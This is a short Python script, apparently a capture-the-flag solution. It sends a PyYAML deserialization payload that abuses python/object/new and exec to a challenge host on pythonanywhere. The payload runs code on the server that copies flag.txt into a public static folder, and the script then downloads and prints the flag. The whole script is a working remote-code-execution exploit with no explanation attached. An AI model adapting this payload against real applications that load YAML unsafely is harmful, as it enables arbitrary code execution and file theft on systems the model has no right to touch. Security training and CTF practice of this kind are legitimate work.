import requests


payload = """
!!python/object/new:Warning
state:
  extend: !!python/name:exec
listitems: 'import shutil; shutil.copy("/home/CTF1/flag.txt", "/home/CTF1/static/flag.txt")'
"""
host = 'https://CTF1.pythonanywhere.com/'

requests.post(host, data=payload)

print(
    "The flag is: ", requests.get('https://ctf1.pythonanywhere.com/static/flag.txt').text
)